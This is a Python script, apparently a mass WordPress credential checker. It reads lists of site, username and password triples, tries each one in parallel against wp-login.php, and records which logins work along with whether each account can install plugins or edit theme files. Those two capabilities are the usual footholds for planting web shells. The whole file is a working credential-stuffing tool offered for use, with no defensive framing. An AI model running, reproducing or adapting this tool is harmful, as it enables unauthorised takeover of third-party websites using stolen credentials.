import os
import re
import sys
from multiprocessing.dummy import Pool as ThreadPool
from requests import request
from colorama import Fore, init
from pystyle import *
init(autoreset=True)

fr = Fore.RED
fg = Fore.GREEN
frs = Fore.RESET

banner = f''''''

headers = { 
    'User-Agent'  : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept'      : 'text/plain'
} 

def normalize_url(url):
    """Add http:// or https:// to URLs that don't have a protocol specified"""
    if not url.startswith(('http://', 'https://')):
        try:
            # Try https first
            resp = request('HEAD', 'https://' + url, timeout=3, allow_redirects=True)
            if resp.status_code < 400:
                return 'https://' + url
        except:
            try:
                # Fall back to http if https fails
                resp = request('HEAD', 'http://' + url, timeout=3, allow_redirects=True)
                if resp.status_code < 400:
                    return 'http://' + url
            except:
                pass
        # If both fail, default to https (but will likely fail later)
        return 'https://' + url
    return url

def check(url):
    try:
        site, user, passwd = '', '', ''

        # Parse different URL formats
        if '@' in url and '#' in url:
            # Format: url#username@password
            site = url.split("#")[0]
            user = url.split("#")[1].split("@")[0]
            passwd = url.split("#")[1].split("@")[1]
        elif url.count('|') == 2:
            # Format: url|username|password
            data_split = url.split("|")
            site = data_split[0]
            user = data_split[1]
            passwd = data_split[2]
        elif url.count(':') >= 2:
            # Format: url:username:password
            # Split from right to handle URLs containing ports
            parts = url.rsplit(':', 2)
            if len(parts) == 3:
                site, user, passwd = parts
            else:
                raise ValueError("Invalid URL format (colon) > " + url)
        else:
            raise ValueError("Invalid URL format > " + url)

        # Normalize the site URL (add protocol if missing)
        site = normalize_url(site).rstrip('/')

        # Create consistent output format
        credential_str = f"{site}:{user}:{passwd}"

        # Set login URL
        login_url = site + '/wp-login.php'

    except Exception as e:
        print(f' -| Error: {e}')
        return

    try:
        resp = request(method='POST', url=login_url, headers=headers, data={
            'log': user,
            'pwd': passwd,
            'wp-submit': 'Log In'
        }, timeout=5, allow_redirects=True).text

        # Check for WordPress dashboard access
        if 'Dashboard' in resp:
            # Check for add plugins permission
            has_add_plugins = 'plugin-install.php' in resp
            # Check for theme file editor permission
            has_theme_editor = 'theme-editor.php' in resp
            
            print(' -| {:<50} --> {}[Login Successfully | Add Plugins: {} | Theme Editor: {}]'.format(
                credential_str, fg, 
                'Yes' if has_add_plugins else 'No', 
                'Yes' if has_theme_editor else 'No'
            ))
            open("result.txt", "a").write(
                f"{credential_str} | Add Plugins: {'Yes' if has_add_plugins else 'No'} | Theme Editor: {'Yes' if has_theme_editor else 'No'}\n"
            )            
        else:
            print(' -| {:<50} --> {}[Login Failed]'.format(credential_str, fr))

    except Exception as e:
        print(' -| {:<50} --> {}[Error]'.format(credential_str, fr))

if __name__ == "__main__":
    try:
        with open(sys.argv[1], 'r') as file:
            lines = file.read().splitlines()

        pp = ThreadPool(int(sys.argv[2]))
        results = pp.map(check, lines)
        pp.close()
        pp.join()

    except IndexError:
        path = str(sys.argv[0]).split('/')
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), 
              Center.XCenter(banner + '\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt> <thread>'+ 
              '\n [*] Contoh: ' + path[len(path) - 1] + ' list.txt 50')))
        sys.exit(1)

    except FileNotFoundError:
        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), 
              Center.XCenter('\n\n  [!] File >' + sys.argv[1] + '< tidak di temukan!')))
        sys.exit(1)
